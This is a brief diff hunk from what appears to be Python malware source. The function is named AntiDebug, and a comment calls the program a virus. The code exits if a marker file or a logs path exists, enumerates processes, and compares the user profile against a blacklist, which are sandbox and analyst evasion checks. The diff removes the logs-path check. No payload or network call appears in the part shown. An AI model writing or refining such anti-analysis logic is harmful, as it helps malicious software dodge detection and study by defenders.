@@ -134,9 +134,6 @@ def AntiDebug():
         if (exists(f'{user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}')):# Checks if a virus has opened on this PC
              _exit(0)
 
-    if  exists(f'{user}\\{config.pathToLogs}'):
-         _exit(0)
-
     processlist = process_iter(['name'])
 
     if  getenv("USERPROFILE") in BlackList.Users:
